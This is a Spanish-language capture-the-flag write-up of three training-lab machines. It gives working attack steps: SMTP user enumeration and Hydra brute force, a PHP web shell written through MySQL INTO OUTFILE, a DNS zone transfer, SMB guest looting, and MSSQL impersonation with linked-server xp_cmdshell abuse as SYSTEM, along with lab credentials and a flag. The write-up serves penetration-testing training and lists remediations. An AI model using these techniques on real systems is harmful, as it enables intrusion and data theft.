>[!Important]
>Este laboratorio fue hecho completamente usando herramientas manuales pero este documento está escrito con ayuda de Inteligencia Artificial para mejoras en la redacción. 
>Las partes escritas en inglés son parte del texto original del laboratorio, sin embargo, lo demás (español) es el procedimiento para resolverlo.

# Attacking Common Services - Easy (WIN-EASY)

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access.
### You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

Se comienza con un escaneo a los puertos comunes con las banderas activas para conocer la versión y la ejecución de Scripts de reconocimiento (propios de nmap) para mayor visibilidad para ataque.

```shell
sudo nmap -Pn -sV -sC -v 10.129.203.7 -T4 -oA easy
--
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
443/tcp  open  https?
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

El escaneo revela varios servicios interesantes: un servidor FTP (`Core FTP Server 2.0`), dos servicios SMTP en los puertos 25 y 587 (`hMailServer`) que exponen el hostname `WIN-EASY`, un servidor web corriendo `XAMPP` sobre Apache (puertos 80/443), una instancia de `MariaDB` en el puerto 3306, y RDP en el puerto 3389. El script `rdp-ntlm-info` confirma que el objetivo es un host Windows cuyo nombre es `WIN-EASY`.

Dado que el servicio SMTP está expuesto, enumeramos nombres de usuario válidos en el servidor de correo usando `smtp-user-enum` con el método `RCPT`:

```shell
smtp-user-enum -t 10.129.203.7 -U users.list -M RCPT -D inlanefreight.htb
---
10.129.203.7: fiona@inlanefreight.htb exists
```

Encontramos el correo de la usuaria `fiona`, confirmando que es un usuario válido del dominio `inlanefreight.htb`.

>[!Important]
>Los puertos de lectura de correo (POP3 110 / IMAP 143, 993, 995) están cerrados, por lo que el buzón de `fiona` no es accesible directamente. Solo queda disponible el SMTP (25/587) para autenticar, así que la fuerza bruta se dirige ahí en lugar de a POP3/IMAP.

Con el usuario confirmado, lanzamos `Hydra` contra el servicio SMTP:

```shell
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
---
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
```

Obtenemos la credencial `fiona:987654321`. Como SMTP solo permite autenticar y enviar correo (no leer el buzón), el valor de esta credencial está en reutilizarla contra otros servicios expuestos.

Probamos la credencial en el servicio FTP (`Core FTP`):

```shell
ftp 10.129.203.7
Name: fiona
Password: 987654321
230 Logged on
```

El acceso es concedido, pero la sesión queda enjaulada (`chroot`) dentro del directorio de `fiona`, no en el filesystem completo. Dentro de ese directorio encontramos un archivo clave, `WebServersInfo.txt`:

```shell
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Este archivo confirma el webroot de Apache/XAMPP: `C:\xampp\htdocs\`, dato decisivo para la explotación. Sin embargo, al estar enjaulada la sesión FTP (`550 CWD failed` al intentar `cd C:/xampp/htdocs`), no es posible subir un webshell directamente por este medio, así que pivotamos a MariaDB, que no está enjaulado.

Probamos la misma credencial reutilizada contra MySQL/MariaDB (el cliente moderno exige TLS, que el servidor no soporta, por lo que se desactiva con `--skip-ssl`):

```shell
mysql -h 10.129.203.7 -u fiona -p --skip-ssl
```

Una vez dentro, revisamos los privilegios del usuario:

```sql
SHOW GRANTS;
---
GRANT ALL PRIVILEGES ON *.* TO `fiona`@`%` IDENTIFIED BY PASSWORD '*DABCF719388B72AD432DE5E88423B56D652DD8B0' ...
```

`fiona` resulta ser administradora de la base de datos (`ALL PRIVILEGES ON *.*`), lo que incluye el privilegio `FILE`, necesario para escribir archivos en disco desde el motor de base de datos.

Con el privilegio `FILE` y el webroot ya identificado, escribimos un webshell PHP directamente en `C:\xampp\htdocs\` usando `INTO OUTFILE`:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

>[!Important]
>Se usan barras normales (`/`) en la ruta porque MySQL interpreta la barra invertida (`\`) como carácter de escape.

Finalmente, ejecutamos comandos a través del webshell vía HTTP, pasando el comando por el parámetro `cmd`:

```shell
http://10.129.203.7/shell.php?cmd=whoami
```

Con RCE confirmado, leemos la flag directamente (sin necesidad de una reverse shell interactiva) usando `type` (el equivalente de `cat` en Windows):

```shell
http://10.129.203.7/shell.php?cmd=type%20C:\Users\Administrator\Desktop\flag.txt
```

La flag se obtiene desde el escritorio del `Administrator`, ya que el proceso de Apache de XAMPP corre con privilegios suficientes para leer ese directorio sin necesidad de escalada adicional.

**Cadena de ataque:** SMTP user enum (`fiona` válida) → fuerza bruta con Hydra sobre SMTP (`fiona:987654321`) → reutilización de la credencial en FTP → `WebServersInfo.txt` revela el webroot → reutilización de la credencial en MariaDB (fiona = DBA con `FILE`) → webshell vía `INTO OUTFILE` en `C:\xampp\htdocs\` → RCE → flag.

**Hallazgos de seguridad:**
- Reutilización de credenciales entre servicios (correo, FTP y base de datos) — vector principal del compromiso.
- Contraseña débil (`987654321`), encontrada en segundos con `rockyou.txt`.
- `VRFY`/`RCPT` habilitado en hMailServer, permitiendo enumeración de usuarios sin autenticación.
- Usuario de base de datos sobreprivilegiado (`ALL PRIVILEGES` + `FILE`) para lo que debería ser una cuenta de aplicación.
- `secure_file_priv` permisivo (default de XAMPP), que permitió el `INTO OUTFILE` hacia el webroot.
- Apache corriendo con privilegios elevados, pudiendo leer el directorio del Administrator sin escalada.

---
# Attacking Common Services - Medium
The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
### Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

**IP:** 10.129.50.101  
**OS:** Linux Ubuntu  
**Dificultad:** Medium  
**Módulo:** Attacking Common Services
## Resumen ejecutivo

Máquina Linux con cinco servicios expuestos: SSH, DNS (BIND), POP3/POP3S (Dovecot), y dos instancias de FTP en puertos no estándar (2121 y 30021). El compromiso se logró por una **cadena de enumeración DNS + acceso anónimo FTP + reutilización de credenciales**:

1. Zone transfer AXFR reveló el mapa completo de la infraestructura interna.
2. FTP anónimo en puerto 30021 (descubierto por escaneo completo de puertos) expuso un archivo con contraseñas candidatas y el nombre de usuario `simon`.
3. Fuerza bruta de SSH con esas contraseñas dio acceso directo a la máquina donde estaba la flag.

**Lección clave de esta máquina:** siempre lanzar un escaneo completo de 65535 puertos (`-p-`) en paralelo con el escaneo rápido inicial — el puerto 30021 no aparece en el top-1000 de nmap y se habría perdido sin eso.
## 1. Enumeración

### Escaneo de puertos (inicial)

```
sudo nmap -Pn -sV -sC -v 10.129.50.101 -T4 -oA medium
```

Servicios identificados:

| Puerto | Servicio | Versión | Nota |
|--------|----------|---------|------|
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) | Vía de entrada final |
| 53 | DNS | ISC BIND 9.16.1 | Zone transfer objetivo |
| 110 | POP3 | Dovecot pop3d | Con STLS |
| 995 | POP3S | Dovecot pop3d (SSL) | POP3 cifrado |
| 2121 | FTP | ProFTPD "InlaneFTP" | Puerto no estándar |

> [!Important] 
> El escaneo inicial no usó `-p-` (todos los puertos). El puerto **30021** (FTP anónimo, el vector real de entrada) no fue detectado hasta un escaneo posterior. Para los siguientes labs, lanzar siempre el escaneo completo en paralelo:
> ```shell
> sudo nmap -Pn -p- --open -T4 10.129.50.101 -oA full_scan &
> ```


### Escaneo completo (corrección)

Detectado posteriormente:

| Puerto | Servicio | Nota |
|--------|----------|------|
| 30021 | FTP | ProFTPD — **login anónimo activo** |
## 2. Enumeración DNS — Zone Transfer (AXFR)

El puerto 53 con BIND activo es un candidato inmediato para zone transfer. El banner del ProFTPD ("InlaneFTP") sugería el dominio `inlanefreight.htb`:

```
dig AXFR @10.129.50.101 inlanefreight.htb
```

Resultado — zona transferida exitosamente (11 registros):

```
inlanefreight.htb.         SOA   inlanefreight.htb. root.inlanefreight.htb.
inlanefreight.htb.         NS    ns.inlanefreight.htb.
app.inlanefreight.htb.     A     10.129.200.5
dc1.inlanefreight.htb.     A     10.129.100.10
dc2.inlanefreight.htb.     A     10.129.200.10
int-ftp.inlanefreight.htb. A     127.0.0.1       ← FTP interno (= ProFTPD en 2121)
int-nfs.inlanefreight.htb. A     10.129.200.70
ns.inlanefreight.htb.      A     127.0.0.1
un.inlanefreight.htb.      A     10.129.200.142
ws1.inlanefreight.htb.     A     10.129.200.101
ws2.inlanefreight.htb.     A     10.129.200.102
wsus.inlanefreight.htb.    A     10.129.200.80
```

**Hallazgo clave:** `int-ftp.inlanefreight.htb → 127.0.0.1` correlaciona con el ProFTPD en puerto 2121 — un servicio marcado como "interno" pero accesible desde fuera.
## 3. Exploración POP3 (110)

```
telnet 10.129.50.101 110
```

POP3 (Dovecot) no soporta `VRFY`/`EXPN` — esos son comandos de **SMTP**, no de POP3. El protocolo POP3 solo valida credenciales con `USER`/`PASS`, no permite enumeración de usuarios sin credenciales. Bloqueado por falta de usuarios válidos en este punto.
## 4. Exploración ProFTPD puerto 2121

### Login anónimo
Denegado.
### Fingerprinting del servidor

El banner muestra `220 ProFTPD Server (InlaneFTP)` — `InlaneFTP` es el `ServerName` personalizado de la config, **no la versión**. Para obtener las capacidades reales hay que conectarse con `nc -C` (flag de CRLF — sin ella el servidor ignora los comandos):

```
nc -C 10.129.50.101 2121
FEAT
```

Respuesta relevante:
```
211-SITE COPY
211-SITE MKDIR
211-SITE RMDIR
211-SITE SYMLINK
211-SITE UTIME
```

**Hallazgo: mod_copy activo** (`SITE COPY` en la lista de features) → **CVE-2015-3306**. Permite copiar archivos arbitrarios del sistema **sin autenticación**. Sin embargo, se pivotó al vector más directo (FTP anónimo en 30021) antes de explotar esto.

> **Nota técnica:** `nc` plano a veces no manda CRLF (`\r\n`) al final de cada línea, que FTP exige. La flag `-C` de netcat fuerza CRLF y resuelve el problema. Alternativa: `telnet` (maneja CRLF por defecto) o `printf 'FEAT\r\n' | nc`.
## 5. FTP anónimo — puerto 30021 (el vector real)

```
ftp anonymous@10.129.50.101 30021
```

```
230 Login successful.
```

Login anónimo exitoso. Contenido del servidor:

```
simon/
  mynotes.txt
```

Contenido de `mynotes.txt`:
```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

**Hallazgos:**
- **Usuario:** `simon` (inferido del directorio `simon/`).
- **Lista de contraseñas candidatas:** 8 entradas, algunas con caracteres especiales (`Rock!ng#May`, `8Ns8j1b!23hs4921smHzwn`) con aspecto de contraseñas reales.

## 6. Fuerza bruta de credenciales

Con usuario `simon` y la wordlist del archivo, se prueba contra todos los servicios disponibles.

### POP3 (110)
```
hydra -l simon -P mynotes.txt 10.129.50.101 pop3 -t 4
```
Sin resultado.

### SSH (22)
```
hydra -l simon -P mynotes.txt ssh://10.129.50.101
```

```
[22][ssh] host: 10.129.50.101   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```

Credencial válida: **`simon : 8Ns8j1b!23hs4921smHzwn`**
## 7. Acceso SSH y flag

```
ssh simon@10.129.50.101
# password: 8Ns8j1b!23hs4921smHzwn
```

Acceso obtenido. La flag estaba en el directorio home de simon.
## Hallazgos de seguridad

- **Zone transfer AXFR permitido públicamente** — BIND expone toda la infraestructura interna sin restricción. Configurar `allow-transfer { none; };` como política base.
- **FTP anónimo en puerto no estándar (30021)** — expone archivos sensibles (lista de contraseñas de un usuario real) sin autenticación. Deshabilitar FTP anónimo.
- **Contraseña de usuario en texto plano** — `mynotes.txt` contenía la contraseña real de SSH de `simon`. Nunca almacenar contraseñas en archivos planos, especialmente en servidores accesibles.
- **ProFTPD con mod_copy activo (CVE-2015-3306)** — copia de archivos arbitrarios sin autenticación. Deshabilitar mod_copy si no es necesario o actualizar ProFTPD.
- **Puerto no estándar como única "protección"** — el 30021 no aparece en el top-1000 de nmap, pero un escaneo completo (`-p-`) lo revela. La seguridad por oscuridad no es seguridad.

## Cadena de ataque resumida

```
nmap -p- (escaneo completo) 
  → puerto 30021 descubierto
  → FTP anónimo → simon/mynotes.txt (passwords)
  → hydra SSH con simon
  → acceso SSH → flag
  
(paralelo) dig AXFR → mapa de infraestructura interna
(paralelo) ProFTPD 2121 → mod_copy activo (CVE-2015-3306, no explotado)
```

---
# Attacking Common Services - Hard

The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

**IP:** 10.129.203.10  
**OS:** Windows Server 2019 (Build 17763)  
**Hostname:** WIN-HARD  
**Dificultad:** Hard  
**Módulo:** Attacking Common Services
## Resumen ejecutivo

Máquina Windows con cuatro servicios expuestos: MSRPC, SMB, MSSQL 2019 y RDP. El compromiso se logró encadenando cuatro técnicas del módulo de MSSQL:

1. **SMB guest** → acceso de lectura al share `Home` → credenciales y usuarios.
2. **Credential stuffing en MSSQL** → acceso como Fiona (guest en el motor).
3. **Impersonación** (`EXECUTE AS LOGIN = 'john'`) → acceso a bases de datos restringidas.
4. **Linked server abuse** → ejecución como `NT AUTHORITY\SYSTEM` → flag.

La nota de John en el share SMB (`information.txt`) actuó como hoja de ruta del lab, revelando las tres técnicas configuradas: base de datos activa, linked server local e impersonación.

**Flag:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`
## 1. Enumeración

### Escaneo de puertos

```
sudo nmap -Pn -sV -sC -v 10.129.203.10 -T4 -oA hard
```

| Puerto | Servicio | Versión | Nota |
|--------|----------|---------|------|
| 135 | MSRPC | Windows RPC | Endpoint mapper (WMI/DCOM) |
| 445 | SMB | Windows | **Signing no requerido** |
| 1433 | MSSQL | **SQL Server 2019 15.00.2000.00 RTM** | Sin parches |
| 3389 | RDP | Windows Server 2019 (10.0.17763) | Host: WIN-HARD |

**Hallazgos del escaneo:**
- **SMB signing no requerido** (`signing:False`) → NTLM relay potencial.
- **MSSQL 2019 RTM** (sin Service Pack) → versión base sin parches.
- Instancia MSSQL: `WIN-HARD\SQLEXPRESS` (nombrada, no default).
- No hay puertos web, FTP ni SSH — superficie acotada a SMB + MSSQL + RDP.
## 2. Enumeración SMB

### Null session — denegada
```
nxc smb 10.129.203.10 -u '' -p '' --shares
# STATUS_ACCESS_DENIED
```

### Guest session — exitosa
```
nxc smb 10.129.203.10 -u 'guest' -p '' --shares
```

```
Share     Permissions   Remark
-----     -----------   ------
ADMIN$                  Remote Admin
C$                      Default share
Home      READ          
IPC$      READ          Remote IPC
```

**Share `Home` con READ** — accesible como guest sin contraseña.

### Exploración del share Home

```
smbclient //10.129.203.10/Home -U guest
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Estructura del share:
```
Home/
  HR/
  IT/
    Fiona/
      creds.txt
    John/
      information.txt
      secrets.txt
    Simon/
      random.txt
  OPS/
  Projects/
```

**Usuarios confirmados:** `Fiona`, `John`, `Simon`

### Archivos encontrados

**`IT/John/information.txt`** — hoja de ruta del lab:
```
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

**`IT/Fiona/creds.txt`:**
```
kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

**`IT/John/secrets.txt`:**
```
1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

**`IT/Simon/random.txt`:**
```
(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@%
```
## 3. Acceso MSSQL — Credential Stuffing

Con los tres usuarios y 15 passwords candidatas, se ataca el MSSQL:

```
nxc mssql 10.129.203.10 -u fiona -p IT/Fiona/creds.txt
```

```
[+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

Credencial válida: **`fiona : 48Ns72!bns74@S84NNNSl`**

Conexión con impacket-mssqlclient:
```
impacket-mssqlclient fiona:'48Ns72!bns74@S84NNNSl'@10.129.203.10
```

Fiona entra como **`guest`** en el motor (prompt: `guest@master`) — el rol más bajo posible.

### Enumeración de bases de datos

```sql
SELECT name FROM master.dbo.sysdatabases
```
```
master, tempdb, model, msdb, TestingDB, TestAppDB
```

`TestAppDB` es inaccesible para Fiona (guest):
```
ERROR: The server principal "WIN-HARD\Fiona" is not able to access the database "TestAppDB"
```
## 4. Escalada MSSQL — Impersonación

### Identificar usuarios impersonables

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
```
john
simon
```

### Verificar privilegios de john y simon

Ninguno es sysadmin (`IS_SRVROLEMEMBER('sysadmin') = 0`), pero con simon impersonado se accede a `TestAppDB`:

```sql
EXECUTE AS LOGIN = 'simon'
SELECT table_name FROM TestAppDB.INFORMATION_SCHEMA.TABLES
```
```
tb_users
```

```sql
SELECT * FROM TestAppDB.dbo.tb_users
```
```
username   password          privileges
--------   --------          ----------
patric     Testuser123!      user
julio      Testadmin123!     admin
```

### Intento de RDP con credenciales obtenidas

Ambas cuentas (`julio` y `patric`) fallan con:
```
ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
```
Las contraseñas de las cuentas Windows están expiradas — RDP directo no es el vector.
## 5. Escalada MSSQL — Linked Server Abuse

### Identificar linked servers

```sql
SELECT srvname, isremote FROM sysservers
```
```
srvname                   isremote
-----------------------   --------
WINSRV02\SQLEXPRESS       1          (servidor remoto)
LOCAL.TEST.LINKED.SRV     0          (linked server local)
```

`LOCAL.TEST.LINKED.SRV` (`isremote = 0`) es un linked server en la misma máquina — el que mencionaba la nota de John.

### Fiona directo al linked server — falla

```sql
EXECUTE('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV]
-- ERROR: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'
```

Fiona (guest) es mapeada a Anonymous Logon — sin acceso.

### John impersonado + linked server — éxito

```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('SELECT @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
```
```
1   1   1   1
```

**`is_srvrolemember('sysadmin') = 1`** — el linked server corre como sysadmin.

**Cadena de escalada:**
```
Fiona (guest) → IMPERSONATE john → john tiene acceso al linked server → linked server = sysadmin
```
## 6. RCE vía xp_cmdshell a través del Linked Server

### Habilitar xp_cmdshell

> [!Important]
> `sp_configure` debe ejecutarse `AT [LOCAL.TEST.LINKED.SRV]`, no en la instancia local donde john es guest. Ejecutarlo directo da `User does not have permission`.

```sql
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
```

### Verificar identidad

```sql
EXECUTE('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
```
```
nt authority\system
```

RCE como **`NT AUTHORITY\SYSTEM`** — el nivel más alto posible.

### Leer la flag

```sql
EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```
```
HTB{46u$!n9_l!nk3d_$3rv3r$}
```
## Cadena de ataque resumida

```
SMB guest → Home share (READ)
  → creds.txt / secrets.txt / random.txt + usuarios (Fiona, John, Simon)
  → information.txt (hoja de ruta: DB + linked server + impersonation)
  
Credential stuffing MSSQL
  → fiona:48Ns72!bns74@S84NNNSl → guest@master

Impersonación (EXECUTE AS LOGIN)
  → simon → TestAppDB → tb_users → julio:Testadmin123! / patric:Testuser123!
  → RDP con julio/patric → ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED (bloqueado)

Impersonación + Linked Server
  → john → LOCAL.TEST.LINKED.SRV → sysadmin
  → sp_configure + xp_cmdshell AT [LOCAL.TEST.LINKED.SRV]
  → whoami = NT AUTHORITY\SYSTEM
  → flag
```
## Hallazgos de seguridad

- **SMB guest habilitado** — acceso de lectura sin credenciales a un share con información sensible.
- **Credenciales en texto plano en SMB** — archivos `creds.txt`, `secrets.txt`, `random.txt` con passwords reales expuestos en un share accesible.
- **Hoja de ruta del atacante en SMB** — `information.txt` revela la arquitectura interna (linked server, impersonación).
- **Usuario MSSQL (Fiona) con permiso IMPERSONATE sobre otras cuentas** — escalada de guest a sysadmin vía impersonación + linked server.
- **Linked server local configurado con cuenta sysadmin** — `LOCAL.TEST.LINKED.SRV` corre como `NT AUTHORITY\SYSTEM`, habilitando escalada desde cualquier usuario con acceso al linked server.
- **xp_cmdshell habilitado vía linked server** — permite ejecución de comandos del SO como SYSTEM.
- **Contraseñas expiradas en cuentas Windows** (julio, patric) — accounts mal gestionadas; en este caso impidieron el vector RDP pero son un hallazgo de gestión de identidades.
- **SMB signing no requerido** — habilita ataques NTLM relay (no fue necesario explotar en este caso).

## Lecciones aprendidas

- **`GO` no es un comando SQL** — es un separador de lotes del cliente (sqlcmd/ssms). En impacket-mssqlclient no existe; los comandos se ejecutan directamente.
- **Todo lo que requiera privilegios del linked server debe ir `AT [nombre]`** — `sp_configure` directo cae en la instancia local donde el usuario es guest.
- **El linked server hereda la identidad de su configuración**, no la del usuario que lo invoca — por eso es un vector de escalada clásico.
- **La impersonación sola no da sysadmin**, pero combinada con un linked server configurado con cuenta privilegiada sí lo hace — es el encadenamiento que hace esta técnica poderosa.
